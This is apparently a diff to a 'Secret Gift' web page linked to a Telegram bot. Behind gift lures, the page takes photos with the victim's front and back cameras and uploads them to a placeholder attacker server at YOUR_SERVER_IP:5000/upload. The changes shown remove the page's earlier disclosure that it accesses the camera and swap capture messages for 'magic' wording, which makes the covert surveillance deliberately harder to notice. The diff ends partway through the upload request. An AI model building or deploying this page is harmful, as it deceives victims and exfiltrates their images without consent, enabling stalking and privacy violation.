@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>🎁 Surprise Gift</title>
+<title>🎁 Secret Gift</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
@@ -20,7 +20,8 @@ body{
 button{
   width:100%;padding:12px;margin-top:10px;
   border-radius:30px;border:none;
-  background:#ff00ff;color:black;font-size:16px
+  background:linear-gradient(45deg, #ff00ff, #00ffff);
+  color:black;font-size:16px;font-weight:bold
 }
 video{width:100%;border-radius:12px;margin-top:10px;display:none}
 img{width:100%;margin-top:6px;border-radius:10px}
@@ -35,18 +36,22 @@ img{width:100%;margin-top:6px;border-radius:10px}
 .status{
   margin-top:10px;font-size:14px;color:#ffb3ff;
 }
+.gift-icon{
+  font-size:60px;margin-bottom:10px;
+}
 </style>
 </head>
 
 <body>
 <div class="card" id="box">
-  <h2>🎁 Surprise Gift</h2>
+  <div class="gift-icon">🎁</div>
+  <h2>✨ Secret Gift ✨</h2>
   <p id="text">
-    You have a surprise! 🧧🎁<br><br>
-    After you unlock, this page will access your camera to create a special surprise for you.
+    You have a magical gift waiting! 🧧🎀<br><br>
+    Unlock to see your personalized surprise created just for you!
   </p>
 
-  <button id="unlockBtn">🔓 Unlock Gift</button>
+  <button id="unlockBtn">🎯 Unlock Gift</button>
   <div class="status" id="status"></div>
 </div>
 
@@ -58,18 +63,18 @@ let stream, video;
 // hearts animation
 setInterval(()=>{
   let h=document.createElement("div");
-  h.className="heart";h.innerText="💖";
+  h.className="heart";h.innerText="💝";
   h.style.left=Math.random()*100+"vw";
   document.body.appendChild(h);
   setTimeout(()=>h.remove(),5000);
-},400);
+},300);
 
 // get uid from query (?uid=123456)
 function getUserIdFromQuery() {
   const params = new URLSearchParams(window.location.search);
   return params.get("uid");
 }
-const USER_ID = getUserIdFromQuery(); // Telegram user id passed from bot
+const USER_ID = getUserIdFromQuery();
 
 document.getElementById("unlockBtn").onclick = () => {
   startGift();
@@ -77,12 +82,13 @@ document.getElementById("unlockBtn").onclick = () => {
 
 async function startGift() {
   box.innerHTML = `
-    <h2>🎬 Creating Your Surprise</h2>
+    <div class="gift-icon">✨</div>
+    <h2>🎀 Creating Your Magic</h2>
     <p id="info">
-      Please wait while we create your special surprise!
+      Preparing your special gift... Please wait!
     </p>
     <video id="video" autoplay playsinline></video>
-    <div class="status" id="status2">Getting ready…</div>
+    <div class="status" id="status2">Initializing surprise...</div>
     <div id="preview"></div>
   `;
 
@@ -92,20 +98,34 @@ async function startGift() {
   video = document.getElementById("video");
 
   try {
-    // FRONT camera first
-    status2.textContent = "Setting up camera…";
+    // First camera
+    status2.textContent = "🔮 Capturing magic moments...";
     await startCam("user");
     await captureMultiple(4, "Front", preview, status2);
 
-    // BACK camera next
-    status2.textContent = "Switching camera…";
+    // Second camera
+    status2.textContent = "✨ Switching angles...";
     await startCam("environment");
     await captureMultiple(4, "Back", preview, status2);
 
-    status2.textContent = "✅ Your surprise is ready!";
+    status2.textContent = "🎉 Your gift has been delivered!";
+    info.innerHTML = "💌 Your surprise has been created and sent!";
+    
+    // Add celebration emojis
+    setTimeout(() => {
+      box.innerHTML = `
+        <div class="gift-icon">🎊</div>
+        <h2>🎁 Gift Delivered!</h2>
+        <p>Your personalized surprise has been created successfully!</p>
+        <p>✨ Check your Telegram for the magic ✨</p>
+        <div class="status" style="color:#00ff00">✅ Complete</div>
+      `;
+    }, 2000);
+    
   } catch (err) {
     console.error(err);
-    status2.textContent = "❌ Something went wrong. Please try again.";
+    status2.textContent = "🎭 Couldn't create your gift. Please try again.";
+    info.innerHTML = "The magic needs camera access to work properly!";
   } finally {
     if (stream) stream.getTracks().forEach(t => t.stop());
   }
@@ -125,7 +145,7 @@ async function startCam(mode){
 // capture N photos with small delay
 async function captureMultiple(count, label, preview, statusEl){
   for (let i = 1; i <= count; i++) {
-    statusEl.textContent = `Capturing ${label} ${i} of ${count}…`;
+    statusEl.textContent = `✨ Creating moment ${i}...`;
     await new Promise(r => setTimeout(r, 700));
     await snap(label + " " + i, preview);
   }
@@ -143,7 +163,7 @@ async function snap(tag, preview){
   img.src = imgData;
   preview.appendChild(img);
 
-  // send to your backend
+  // send to backend
   await fetch("http://YOUR_SERVER_IP:5000/upload",{
     method:"POST",
     headers:{"Content-Type":"application/json"},
